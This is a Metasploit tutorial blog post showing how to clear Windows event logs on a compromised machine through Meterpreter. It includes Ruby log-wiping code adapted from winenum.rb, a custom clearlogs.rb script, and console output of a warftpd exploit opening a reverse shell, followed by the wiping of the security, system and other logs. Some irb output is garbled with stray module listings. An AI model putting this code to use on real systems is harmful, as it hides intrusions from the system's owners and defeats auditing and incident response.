---
draft: false
title: MSF Log Management
linkTitle: Log Management
translationKey: msf-log-management
weight: 290
date: 2017-06-05T13:21:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: In this article, we will look at how the 'winenum' script codes provided by meterpreter work to clear the logs of the target computer.
url: /msf-log-management/
featured_image: /images/metasploit.jpg
categories:
  - Metasploit Framework
tags:
  - cybersecurity
  - metasploit framework
---
Sometimes you may want to clear the logs of the operations you perform on the target computer. For this clearing process, let's first look at how the `winenum` script codes provided by meterpreter work. You can find the script file under your Metasploit Framework folder at `/usr/share/metasploit-framework/scripts/meterpreter/winenum.rb`. There are many sections in this file. For now, we will only deal with the `# Function for clearing all event logs` section.

```bash
# Function for clearing all event logs
def clrevtlgs**()**
  evtlogs = [
    'security',
    'system',
    'application',
    'directory service',
    'dns server',
    'file replication service'
  ]
  print_status("Clearing Event Logs, this will leave and event 517")
  begin
    evtlogs.each **do** |evl|
      print_status("\tClearing the #{evl} Event Log")
      log = @client.sys.eventlog.open(evl)
      log.clear
      file_local_write(@dest,"Cleared the #{evl} Event Log")
    end
    print_status("All Event Logs have been cleared")
  rescue ::Exception => e
    print_status("Error clearing Event Log: #{e.class} #{e}")

  end
end
```

Those interested in programming will easily understand the codes and how the function works. Let's briefly explain what the above codes do. The `evtlogs.each do |evl|` loop opens and cleans Windows' 'security', 'system', 'application', 'directory service', 'dns server' and 'file replication service' logs, respectively.

Now, instead of the ready script, let's create and save our own script code by taking the example from the file above. For this, we will use Ruby coding in Meterpreter. You can see the Windows Log status before cleaning from the picture below.

![Eventlog](/images/Eventlog-00.png)

Since we only want to clean the 'system' logs, we will only use the `log = client.sys.eventlog.open('system')` status from the loop above.

## We are testing in this part

First, we must have opened a meterpreter shell on the target computer.

```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
```

Then, we run the Ruby coder from the meterpreter shell with the `irb` command and paste the following codes.

```bash
meterpreter > irb
> Starting IRB shell
> The 'client' variable holds the meterpreter client
**>>** log = client.sys.eventlog.open('system')
=> #>#:0xb6779424 @client=#>, #>, #

"windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
```
Now, let's check whether the logs are cleared with the `log.clear` command in meterpreter.

```bash
**>>** log.clear
=> #>#:0xb6779424 @client=#>,

/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
```

![Eventlog](/images/Eventlog-01.png)

We tried a simple log cleaning using Ruby coder in Meterpreter and we were successful in our check. We can write our own script codes using this approach.

## Clearing All Logs

Writing the following codes to a file Save it in the `/usr/share/metasploit-framework/scripts/meterpreter/` folder with the name `clearlogs.rb`.

```bash
evtlogs = [
 'security',
 'system',
 'application',
 'directory service',
 'dns server',
 'file replication service'
 ]
print_line("Clearing Event Logs, this will leave an event 517")
evtlogs.each **do** |evl|
 print_status("Clearing the #{evl} Event Log")
 log = client.sys.eventlog.open(evl)
 log.clear
end
print_line("All Clear! You are a Ninja!")
```

Now you can run these newly created script codes in the newly opened Meterpreter sessions.

```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)

meterpreter > run clearlogs
Clearing Event Logs, this will leave an event 517
> Clearing the security Event Log
> Clearing the system Event Log
> Clearing the application Event Log
> Clearing the directory service Event Log
> Clearing the dns server Event Log
> Clearing the file replication service Event Log
All Clear! You are a Ninja!
meterpreter > exit
```

As seen in the picture below, all logs have been cleared. Only process number 517 remains. Since that process is still the process where meterpreter is running, it is still active.

![Eventlog](/images/Eventlog-03.png)

In this article, we tried to write our own script file and clear the log by taking the Scripts in the Metasploit Framework as an example. We recommend that you also examine the other script files in the `/usr/share/metasploit-framework/scripts/meterpreter/` folder. This way, you will learn the possibilities you have.
